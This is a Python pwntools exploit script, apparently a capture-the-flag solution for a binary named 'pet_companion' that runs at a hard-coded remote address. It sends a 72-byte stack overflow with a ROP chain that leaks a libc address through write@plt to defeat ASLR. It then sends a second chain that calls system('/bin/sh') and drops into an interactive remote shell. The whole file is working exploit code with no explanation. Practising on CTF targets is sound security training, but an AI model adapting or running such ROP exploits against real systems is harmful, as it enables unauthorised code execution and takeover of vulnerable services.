from pwn import *
from icecream import ic

elf = exe = ELF("./pet_companion")
libc = elf.libc
context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("83.136.249.159", 30987)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b *0x00000000004006be
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def i(): return io.interactive()

io = start()
poprdi = 0x0000000000400743
poprsir15 = 0x0000000000400741
ru("ent status:")
payload = b'a'*72
payload += p64(poprdi)
payload += p64(1)
payload += p64(poprsir15)
payload += p64(elf.got['write'])
payload += p64(0)
payload += p64(elf.plt['write'])
# payload += p64(ret)
payload += p64(elf.sym['main'])
sl(payload)
rl()
rl()
rl()
libc_base = u64(io.recv(8))
libc.address = libc_base - 0x1100f0
ic(hex(libc.address))
binsh = libc.address + 0x1b3d88
sys = libc.address + 0x4f420

payload = b'a'*72
payload += p64(poprdi)
payload += p64(binsh)
payload += p64(sys)
ru(" status:")
sl(payload)
i()
